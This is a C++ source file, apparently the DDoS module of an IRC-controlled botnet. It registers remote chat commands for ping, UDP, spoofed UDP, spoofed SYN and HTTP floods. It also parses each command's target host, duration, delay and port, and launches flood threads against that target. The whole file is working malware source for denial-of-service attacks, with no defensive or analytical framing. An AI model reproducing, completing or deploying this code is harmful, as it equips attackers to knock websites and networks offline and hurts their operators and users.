
#include "main.h"
#include "ddos.h"
#include "mainctrl.h"
#include "synflood.h"
#include "junoflood.h"
#include "httpflood.h"

void CDDOS::Init()
{	
	m_iNumThreads=0;
	m_bDDOSing=false;
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPing,			"ddos.pingflood",	"starts a Ping flood",											this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdUDP,			"ddos.udpflood",	"starts an UDP flood",											this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSpoofedUDP,	"ddos.spudpflood",	"starts a spoofed UDP flood",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSyn,			"ddos.synflood",	"starts a spoofed SYN flood",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdHTTP,			"ddos.httpflood",	"starts a HTTP flood, can also be used as .visit replacement",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStop,			"ddos.stop",		"stops all ddoses running",										this); }

/*
	.ddos.synflood <host> <time> <delay> <port>
	 - port 0 = random port
	.ddos.udpflood <host> <number> <size> <delay> <port>
	 - port 0 = random port
	.ddos.spudpflood <host> <number> <size> <delay> <port>
	 - port 0 = random port
	.ddos.pingflood <host> <number> <size> <delay>
	.ddos.httpflood <url> <number> <referrer> <delay> <recursive>
	 - delay 0 = random delay (1-24h)
	 - recursive = get page resources
*/

bool CDDOS::HandleCommand(CMessage *pMsg)
{
#ifdef DBGCONSOLE
        g_cMainCtrl.m_cConsDbg.Log(10, "File =%s:Line=%d:Function=%s \n",__FILE__, __LINE__, __FUNCTION__);
        g_cMainCtrl.m_cConsDbg.Log(10, "*%s* %s  \n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
#endif
	if(!pMsg->sCmd.Compare("ddos.synflood"))
	{	
		CDDOSSynFlood *pTemp=new CDDOSSynFlood; 
		m_bDDOSing=true;
		pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); 
		pTemp->m_bSilent=pMsg->bSilent; 
		pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("ddos.httpflood"))
	{	
		CDDOSHTTPFlood *pTemp=new CDDOSHTTPFlood; 
		m_bDDOSing=true; 
		pTemp->m_pDDOS=this;
		pTemp->m_sURL.Assign(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_sReferrer.Assign(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
		if(!pMsg->sChatString.Token(5, " ").CompareNoCase("true"))
			pTemp->m_bRecursive=true; else pTemp->m_bRecursive=false;
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pTemp->m_bSilent=pMsg->bSilent;
		pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); 
	}

	if(!pMsg->sCmd.Compare("ddos.stop")) m_bDDOSing=false;

	return true; }

void *CDDOSBase::Run()
{	
	if(!(g_cMainCtrl.m_cBot.ddos_maxthreads.iValue<m_pDDOS->m_iNumThreads))
		m_pDDOS->m_iNumThreads++; StartDDOS(); m_pDDOS->m_iNumThreads--;
	g_cMainCtrl.m_lCanJoin.push_back(this); 
	return NULL;
}
